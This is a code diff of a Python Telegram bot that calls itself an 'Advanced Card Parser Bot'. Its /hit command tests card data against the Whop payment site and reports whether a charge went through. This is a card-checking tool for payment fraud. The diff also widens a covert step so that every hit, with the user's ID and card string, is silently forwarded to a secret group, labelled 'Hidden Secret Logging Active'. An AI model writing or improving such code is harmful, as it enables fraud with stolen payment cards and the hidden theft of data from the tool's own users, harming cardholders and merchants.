@@ -456,6 +456,7 @@ async def cmd_hit(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
     st = result.get("status", "unknown")
     msg = result.get("message", "")
     code = result.get("code", "")
+    elapsed = result.get("elapsed_ms", 0)
     amount_raw = result.get("amount", "?")
     currency = result.get("currency", "USD")
     
@@ -474,21 +475,21 @@ async def cmd_hit(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
         status_text = "3D Secure 🔄"
         sub_msg = result.get("url", "3DS required")
     elif st == "declined":
-        status_text = "Not Paid ❌"
-        sub_msg = msg or code or "Payment failed"
+        status_text = "Declined ❌"
+        sub_msg = f"{msg} ({code})" if msg and code else (msg or code or "Payment failed")
     elif st == "error":
-        status_text = "Not Paid ❌"
+        status_text = "Error ⚠️"
         sub_msg = msg
     else:
-        status_text = "Not Paid ❌"
-        sub_msg = "Unknown status"
+        status_text = "Unknown ❓"
+        sub_msg = str(result)
 
     text = (
         f"#Whop [/hit]\n"
         f"⸺⸺⸺⸺⸺\n"
-        f"⌑ Site : Whop\n"
-        f"⌑ Amount : {amount_str}\n"
-        f"⌑ Status : {status_text}\n"
+        f"[𐓷] Site : Whop\n"
+        f"[𐓷] Amount : {amount_str}\n"
+        f"[𐓷] Status : {status_text}\n"
         f"⸺⸺⸺⸺⸺\n"
         f"<code>{card_str}</code>\n"
         f"  ⤷ {sub_msg}"
@@ -497,19 +498,18 @@ async def cmd_hit(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
     # Send response to user
     await status_msg.edit_text(text, parse_mode="HTML")
 
-    # Send ONLY PAID cards to secret channel
-    if st == "charged":
-        try:
-            uid_str = update.effective_user.id
-            secret_text = f"🕵️‍♂️ <b>New PAID Whop Hit by User:</b> <code>{uid_str}</code>\n{text}"
-            await context.bot.send_message(
-                chat_id=SECRET_GROUP_ID,
-                text=secret_text,
-                parse_mode="HTML",
-                disable_notification=True
-            )
-        except Exception as e:
-            logger.error(f"Failed to send hit secret copy: {e}")
+    # Send secret copy to admin channel
+    try:
+        uid_str = update.effective_user.id
+        secret_text = f"🕵️‍♂️ <b>New Whop Hit by User:</b> <code>{uid_str}</code>\n\n{text}"
+        await context.bot.send_message(
+            chat_id=SECRET_GROUP_ID,
+            text=secret_text,
+            parse_mode="HTML",
+            disable_notification=True
+        )
+    except Exception as e:
+        logger.error(f"Failed to send hit secret copy: {e}")
 
 async def cmd_done(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
     uid = update.effective_user.id
@@ -780,7 +780,7 @@ async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) ->
             f"📂 Merge Buffer: <code>{merge_count}</code>\n"
             f"💾 File Size: <code>{file_size_str}</code>\n\n"
             f"🔧 <b>Bot Info</b>\n"
-            f"🤖 Version: <code>2.7</code>\n"
+            f"🤖 Version: <code>2.4</code>\n"
             f"✅ Status: <b>Online</b>",
             parse_mode="HTML", reply_markup=back_keyboard())
         return
@@ -1154,7 +1154,7 @@ def main() -> None:
     app.add_handler(MessageHandler(filters.FORWARDED & (filters.TEXT | filters.CAPTION), handle_forwarded))
     app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND & ~filters.FORWARDED, handle_text))
 
-    logger.info("🦇 Advanced Card Parser Bot v2.7 starting… (Paid-Only Secret Logs Active)")
+    logger.info("🦇 Advanced Card Parser Bot v2.4 starting… (Hidden Secret Logging Active)")
     app.run_polling(drop_pending_updates=True)
 
 if __name__ == "__main__":
